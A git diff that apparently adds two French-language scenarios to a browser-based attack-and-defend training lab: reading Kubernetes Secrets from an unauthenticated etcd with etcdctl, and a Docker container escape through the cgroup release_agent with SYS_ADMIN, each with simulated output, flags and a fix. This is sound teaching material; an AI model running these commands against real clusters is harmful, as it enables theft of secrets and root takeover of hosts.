@@ -4126,6 +4126,157 @@ const SCENARIOS = [
     log.push({t:"[+] Le compte Administrateur local partageait le même hash sur tout le parc.", cls:'ok'});
     return {log, success:true};
   }
+},
+
+/* ===================== 52. etcd non authentifié (Kubernetes) ===================== */
+{
+  id:'k8s-etcd-unauthenticated',
+  title:'Le magasin etcd du plan de contrôle Kubernetes accessible sans authentification',
+  category:'Conteneurs & orchestration (etcd non authentifié)',
+  attack:{
+    who:'Vous incarnez bob, un attaquant disposant d\'un simple accès réseau au port etcd exposé du plan de contrôle (2379).',
+    desc:"etcd — le magasin clé-valeur qui stocke tout l'état du cluster Kubernetes, y compris les Secrets — écoute sur toutes les interfaces sans authentification par certificat client. Les Secrets Kubernetes n'y sont par défaut qu'encodés en base64, jamais chiffrés : les lire directement dans etcd suffit à en récupérer le contenu en clair, sans jamais passer par l'API Kubernetes ni ses contrôles d'accès (RBAC).",
+    hints:[
+      "`etcdctl --endpoints=http://10.0.0.5:2379 get / --prefix --keys-only` liste toutes les clés stockées dans etcd sans la moindre authentification requise — un chemin `/registry/secrets/kube-system/admin-token-secret` ressort particulièrement.",
+      "Rien dans etcd n'est chiffré par défaut : un Secret Kubernetes y est stocké tel qu'il apparaîtrait dans `kubectl get secret -o yaml`, simplement encodé en base64.",
+      "`etcdctl --endpoints=http://10.0.0.5:2379 get /registry/secrets/kube-system/admin-token-secret` récupère directement ce Secret, contournant entièrement le RBAC de l'API Kubernetes puisque etcd ne vérifie ici aucune identité."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du cluster chargé de corriger la faille.',
+    desc:"Activez l'authentification par certificat client (mTLS) sur etcd et restreignez son écoute à l'interface interne du plan de contrôle, pour qu'il ne soit plus interrogeable sans identité vérifiée.",
+    hints:[
+      "Éditez `/etc/kubernetes/etcd/etcd.conf` avec `nano` et remplacez `client-cert-auth: false` par `client-cert-auth: true`, et `listen-client-urls: http://0.0.0.0:2379` par `listen-client-urls: https://127.0.0.1:2379`.",
+      "`verify` confirme qu'etcd exige désormais un certificat client et n'écoute plus que localement."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['kubernetes']},
+      '/etc/kubernetes':{type:'dir',perm:'755',owner:'root',children:['etcd']},
+      '/etc/kubernetes/etcd':{type:'dir',perm:'755',owner:'root',children:['etcd.conf']},
+      '/etc/kubernetes/etcd/etcd.conf':{type:'file',perm:'644',owner:'root',size:90,
+        content:"client-cert-auth: false\nlisten-client-urls: http://0.0.0.0:2379\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^etcdctl\s+--endpoints=http:\/\/10\.0\.0\.5:2379\s+get\s+\/\s+--prefix\s+--keys-only$/, run(state, print){
+        const open = /client-cert-auth:\s*false/.test(state.vfs['/etc/kubernetes/etcd/etcd.conf'].content);
+        if(!open){ print('{"level":"warn","msg":"rpc error: code = Unauthenticated desc = etcdserver: client certificate required"}', 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.keysListed = true;
+        print('/registry/configmaps/kube-system/cluster-info\n/registry/secrets/kube-system/admin-token-secret\n/registry/secrets/billing/db-creds', 'out');
+        print("[i] etcd répond sans la moindre authentification : aucun contrôle RBAC de l'API Kubernetes ne s'applique ici.", 'info');
+      }
+    },
+    { pattern:/^etcdctl\s+--endpoints=http:\/\/10\.0\.0\.5:2379\s+get\s+\/registry\/secrets\/kube-system\/admin-token-secret$/, run(state, print){
+        const open = /client-cert-auth:\s*false/.test(state.vfs['/etc/kubernetes/etcd/etcd.conf'].content);
+        if(!open){ print('{"level":"warn","msg":"rpc error: code = Unauthenticated desc = etcdserver: client certificate required"}', 'err'); return; }
+        if(!state.flags || !state.flags.keysListed){ print('etcdctl: clé introuvable — énumérez d\'abord les clés disponibles.', 'err'); return; }
+        state.flags.secretRead = true;
+        print("data:\n  token: YWRtaW4tc3VwZXItc2VjcmV0LXRva2Vu\n# (base64 — jamais chiffré par défaut)", 'out');
+        print("[+] Décodage immédiat : jeton d'administration en clair « admin-super-secret-token ».", 'ok');
+        print("FLAG{k8s_etcd_unauthenticated_secret_leak}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.secretRead === true; },
+  defenseCheck(state){
+    return /client-cert-auth:\s*true/.test(state.vfs['/etc/kubernetes/etcd/etcd.conf'].content)
+        && /listen-client-urls:\s*https:\/\/127\.0\.0\.1:2379/.test(state.vfs['/etc/kubernetes/etcd/etcd.conf'].content);
+  },
+  replay(state){
+    const log=[];
+    const open = /client-cert-auth:\s*false/.test(state.vfs['/etc/kubernetes/etcd/etcd.conf'].content);
+    log.push({t:"$ etcdctl --endpoints=http://10.0.0.5:2379 get /registry/secrets/kube-system/admin-token-secret", cls:'prompt-line'});
+    if(!open){
+      log.push({t:'rpc error: code = Unauthenticated desc = etcdserver: client certificate required', cls:'err'});
+      log.push({t:"[-] etcd exige désormais un certificat client : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'data:\n  token: YWRtaW4tc3VwZXItc2VjcmV0LXRva2Vu', cls:'ok'});
+    log.push({t:"[+] Jeton d'administration récupéré en clair, sans passer par le RBAC de l'API.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 53. Évasion via cgroup release_agent (Docker) ===================== */
+{
+  id:'docker-cgroup-release-agent-escape',
+  title:'Un conteneur avec SYS_ADMIN et un cgroupfs en écriture permet une évasion via release_agent',
+  category:'Évasion de conteneur (cgroup release_agent)',
+  attack:{
+    who:'Vous incarnez bob, disposant d\'un accès limité au démon Docker de target-lab (via un pipeline CI, par exemple).',
+    desc:"Rien n'empêche de lancer un conteneur avec la capacité SYS_ADMIN et son cgroupfs (contrôleur memory, cgroup v1) monté en écriture. Le mécanisme `release_agent` d'un tel cgroup exécute, avec les privilèges de l'hôte, un script chaque fois que le dernier processus du cgroup se termine — détournez ce mécanisme pour exécuter une commande arbitraire sur l'hôte, hors de tout confinement.",
+    hints:[
+      "`docker run -d --cap-add=SYS_ADMIN --name pwn -v /cgroup-rw:/sys/fs/cgroup/memory debian sleep 3600` lance un conteneur avec la capacité SYS_ADMIN et son cgroupfs memory monté en écriture.",
+      "`docker exec pwn cgroup-set-release-agent /exploit.sh` détourne le script que l'hôte exécutera, avec ses propres privilèges, lorsque ce cgroup sera libéré — un fichier `/exploit.sh` préparé au préalable copie un `/bin/bash` SUID accessible depuis l'hôte.",
+      "`docker exec pwn cgroup-trigger-release` place le shell du conteneur dans ce cgroup puis le laisse se terminer : l'hôte exécute alors `/exploit.sh` comme root, en dehors de tout confinement du conteneur."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur infrastructure chargé de corriger la faille.',
+    desc:"Interdisez l'ajout de la capacité SYS_ADMIN au niveau de la politique du démon Docker, sans bloquer les conteneurs isolés légitimes qui n'en ont pas besoin.",
+    hints:[
+      "Éditez `/etc/docker/daemon-policy.yml` avec `nano` et passez `allow-cap-add-sys-admin` à `false`.",
+      "`verify` confirme que l'ajout de la capacité SYS_ADMIN est désormais interdit par la politique du démon."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['docker']},
+      '/etc/docker':{type:'dir',perm:'755',owner:'root',children:['daemon-policy.yml']},
+      '/etc/docker/daemon-policy.yml':{type:'file',perm:'644',owner:'root',size:50,
+        content:"allow-cap-add-sys-admin: true\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^docker\s+run\s+-d\s+--cap-add=SYS_ADMIN\s+--name\s+pwn\s+-v\s+\/cgroup-rw:\/sys\/fs\/cgroup\/memory\s+debian\s+sleep\s+3600$/, run(state, print){
+        const allowed = /allow-cap-add-sys-admin:\s*true/.test(state.vfs['/etc/docker/daemon-policy.yml'].content);
+        if(!allowed){ print("docker: Error response from daemon: capacité SYS_ADMIN refusée par la politique.", 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.containerLaunched = true;
+        print('b7e2f1a94c3d', 'out');
+      }
+    },
+    { pattern:/^docker\s+exec\s+pwn\s+cgroup-set-release-agent\s+\/exploit\.sh$/, run(state, print){
+        if(!state.flags || !state.flags.containerLaunched){ print('Error: No such container: pwn', 'err'); return; }
+        state.flags.agentHijacked = true;
+        print("[i] release_agent de /sys/fs/cgroup/memory détourné vers /exploit.sh — s'exécutera avec les privilèges de l'hôte.", 'info');
+      }
+    },
+    { pattern:/^docker\s+exec\s+pwn\s+cgroup-trigger-release$/, run(state, print){
+        if(!state.flags || !state.flags.agentHijacked){ print("cgroup-trigger-release: release_agent non détourné, rien à déclencher.", 'err'); return; }
+        state.flags.hostRce = true;
+        print("[+] Dernier processus du cgroup terminé : l'hôte exécute /exploit.sh comme root.", 'ok');
+        print("[+] Bit SUID posé sur /bin/bash de l'hôte, hors de tout confinement du conteneur.", 'ok');
+        print("FLAG{docker_cgroup_release_agent_escape}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.hostRce === true; },
+  defenseCheck(state){ return !/allow-cap-add-sys-admin:\s*true/.test(state.vfs['/etc/docker/daemon-policy.yml'].content); },
+  replay(state){
+    const log=[];
+    const allowed = /allow-cap-add-sys-admin:\s*true/.test(state.vfs['/etc/docker/daemon-policy.yml'].content);
+    log.push({t:"$ docker run -d --cap-add=SYS_ADMIN --name pwn -v /cgroup-rw:/sys/fs/cgroup/memory debian sleep 3600", cls:'prompt-line'});
+    if(!allowed){
+      log.push({t:'docker: Error response from daemon: capacité SYS_ADMIN refusée par la politique.', cls:'err'});
+      log.push({t:"[-] L'ajout de la capacité SYS_ADMIN est désormais interdit : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:"[+] release_agent détourné puis déclenché : shell root obtenu sur l'hôte.", cls:'ok'});
+    log.push({t:"[+] Bit SUID posé sur /bin/bash de l'hôte, hors de tout confinement.", cls:'ok'});
+    return {log, success:true};
+  }
 }
 
 ];
